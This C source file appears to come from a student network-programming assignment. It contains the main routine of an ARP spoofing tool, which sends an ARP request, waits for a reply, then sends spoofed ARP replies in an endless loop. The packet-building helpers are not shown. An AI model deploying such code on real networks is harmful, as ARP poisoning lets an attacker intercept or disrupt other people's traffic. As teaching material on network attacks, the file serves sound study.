/*
** EPITECH PROJECT, 2018
** NWP_myarpspoofing_2018
** File description:
** arpspoofing.c
*/

#include "arpspoofing.h"

int arpspoofing(char **av)
{
    arp_t *arp = init_arp(av);
    uint32_t dst = inet_addr(arp->dest);
    uint32_t src;
    char mac[MAC_LEN];
    int ifindex;
    int fd;

    if (dst == 0 || dst == 0xffffffff)
        error("Invalid source IP");

    ifr_getter(arp->iface, &src, mac, &ifindex);
    bind_arp(ifindex, &fd);
    send_arp(fd, ifindex, mac, src, dst);

    while (42) {
        if (read_arp(fd, arp) == 0)
            break;
    }
    while (42) {
        send_spoof(arp, fd, ifindex, mac, src, dst);
    }
    return (0);
}

void help(void)
{
    printf("USAGE:\n\n");
    printf("\tsrc_ip\tis the source IP.\n");
    printf("\tdest_ip\tis the destination IP.\n");
    printf("\tiface\tis the interface to use to send/receive packets.\n");
}

int main(int ac, char **av)
{
    if (ac == 4)
        arpspoofing(av);
    else if (ac == 5) {
        if (strcmp(av[4], "--printBroadcast") == 0)
            printf("Broadcast\n");
        if (strcmp(av[4], "--printSpoof") == 0)
            printf("Spoof\n");
    } else {
        help();
        return (84);
    }
    return (0);
}